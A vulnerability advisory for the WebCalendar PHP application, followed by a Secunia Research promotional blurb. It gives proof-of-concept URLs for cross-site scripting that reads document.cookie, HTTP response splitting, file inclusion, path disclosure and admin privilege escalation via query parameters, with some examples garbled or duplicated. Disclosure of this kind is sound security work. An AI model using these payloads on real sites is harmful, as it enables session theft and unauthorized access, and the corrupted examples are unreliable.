              Multiple Vulnerabilities in WebCalendar
---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

WebCalendar - Web Calendar Application

WebCalendar is a PHP application used to
maintain a calendar for a single user
or an intranet group of users. It can also be
configured as an event calendar.

Web : <http://webcalendar.sourceforge.net>

---------------------------------------------------------------------------

Vulnerabilities:
~~~~~~~~~~~~~~~~

A. Cross Site Scripting Vulnerabilities in various
scripts.

A1. WebCalendar check the &lt;script&gt;any&lt;/script&gt;
format of XSS attacks but
doesn't check <img src based attacks. To test the
vulnerabilities you can try
the following POCs:

http://<site-with-webcalendar>/demo/view_entry.php?idA972"><img%20src=<http://images.so> \
urceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>&date \
041001

http://<site-with-webcalendar>/demo/view_d.php?ide7"><img%20src=<http://images.sourcefo> \
rge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)%20height=0%20width=0>&date \
041009

http://<site-with-webcalendar>/demo/usersel.php?formíitentryform.elements[[20]](#20);
%0d%0aalert(document.cookie);//&listid &usersÞmo,demo1,demo2

http://<site-with-webcalendar>/demo/datesel.php?formíitentryform.elements[[20]](#20).rpt_day. \
selectedIndex%20=%20day%20-%201;alert(document.cookie);//"><img%20src=<http://images.so> \
urceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>&fday=rpt_day&fmonth=rpt_month&fyear=rpt_year&date \
041001

http://<site-with-webcalendar>/demo/datesel.php?formíitentryform&fday=rpt_day"%20onclick=javascript:alert(document.cookie)>&fmonth=rpt_month&fyear=rpt_year&date \
041001

http://<site-with-webcalendar>/demo/includes/trailer.php?user="><img%20src=<http://imag> \
es.sourceforge.net/images/head_bg_new.gif%20onload=javascript:alert(document.cookie)>

http://<site-with-webcalendar>/demo/includes/styles.php?FONTS=asdf}%0A--></style>&lt;script&gt;alert(document.cookie)&lt;/script&gt;

NOTE: Almost any GLOBAL parameter in this script
is vulnerable

B. HTTP Response Splitting Error

B1. Due to a poor input validation in the script
login.php HTTP Response Splitting
attacks are possible. You can try the vulnerability
with the following POC :

http://<site-with-webcalendar>/demo/login.php?return_path=%0d%0aContent-Length:0%0d%0a \
%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0dContent-Type:text/html%0d%0aContent-Length:9%0d%0aHi
 to all

C. Possible code execution

C1. If an attacker is abble to upload a file via ftp or
other system to the web directory
there is a flaw that allows to execute any file in the
web tree. To try the vulnerability
you can try this url :

http://<site-with-webcalendar>/demo/includes/init.php?user_inc=the_file_that_you_upload_via_ftp_or_other

Note: Almost this is a full path disclosure.

D. Full Path Disclosure

D1. Because of a poor validation of the parameter
enconded_login in the PHP script
validate.php, there is a vulnerability that shows
the full path of the script in the
web server.

http://<site-with-webcalendar>/demo/includes/validate.php?encoded_login(Full Path \
Disclosure)

E. Admin Privileges

E1. To make various actions you need to be the
administrator of the webcalendar
application but various scripts are vulnerable to
Variable Poisoning attacks.
Privilege escalation is possible using the following
methods :

Example 1 :

You doesn't have permission:

http://<site-with-webcalendar>/demo/view_entry.php?idA972&date \
041001&is_admin=true&is_nonuser_admin=true&is_assistant=true

But using it yes:

http://<site-with-webcalendar>/demo/view_entry.php?idA972&date \
041001&is_admin=true&is_nonuser_admin=true&is_assistant=true

Example 2 :

http://<site-with-webcalendar>/demo/view_entry.php?idA972&date \
041001&is_admin=true&is_nonuser_admin=true&is_assistant=true&id Example 3 :

No permission ->
<http://webcalendar.sourceforge.net/demo/upcoming.php>
Permission Granted :) ->
<http://webcalendar.sourceforge.net/demo/upcoming.php?public_must_be_enabled=true&public_access=Y>

Notes
~~~~~

The poor method that uses to protect against XSS
attacks in the script functions.php
is the following :

// This code is a temporary hack to make the
application work when
// register_globals is set to Off in php.ini (the
default setting in
// PHP 4.2.0 and after).
if ( ! empty ( $HTTP_GET_VARS ) ) {
  while (list($key, $val) @each($HTTP_GET_VARS)) {
    // don't allow anything to have &lt;script&gt; in it...
    if ( ! is_array ( $val ) ) {
      if ( preg_match ( "/<\s*script/i", $val ) ) {
        echo "Security violation!"; exit;
      }
    }

Is very easy to by pass these basic security checks
by using Unicode encoded strings,
or using any other valid XSS attack, such as <img
src attacks.

More Notes
~~~~~~~~~~

The developers (in special Jeff Hoover) of
WebCalendar has been demostrated
seriousness with the fixes and responses about
these errors.

The fix:
~~~~~~~~

The problems has been fixed in the CVS repository.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
